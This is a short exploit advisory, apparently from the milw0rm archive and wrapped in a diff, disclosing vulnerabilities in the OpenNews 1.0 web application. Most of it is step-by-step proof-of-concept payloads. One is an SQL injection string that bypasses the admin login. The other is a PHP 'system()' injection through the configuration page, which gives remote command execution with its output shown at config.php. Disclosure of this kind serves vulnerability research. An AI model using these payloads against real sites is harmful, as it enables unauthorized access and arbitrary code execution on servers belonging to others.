@@ -1,0 +1,42 @@
+####################################################################
+[+] OpenNews 1.0 (SQLI/RCE) Multiple Remote Vulnerabilities
+[+] Discovered By SirGod
+[+] http://insecurity-ro.org
+[+] http://h4cky0u.org
+####################################################################
+
+[+] Download : http://sourceforge.net/projects/opennews-sun/
+
+[+] SQL Injection (Auth Bypass)
+
+ - Note : magic_quotes_gpc = off
+
+ - PoC
+
+     http://127.0.0.1/admin.php
+
+     Username : admin ' or ' 1=1
+     Password : anything
+
+[+] Remote Command Execution
+
+  - PoC
+
+    Go to
+
+        http://127.0.0.1/admin.php?action=setconfig
+
+    in the Overall Width write
+
+        ';system(YOUR COMMAND);'
+
+    then go to
+
+        http://127.0.0.1/config.php
+
+    to see your command result.
+
+
+####################################################################
+
+# milw0rm.com [2009-08-05]
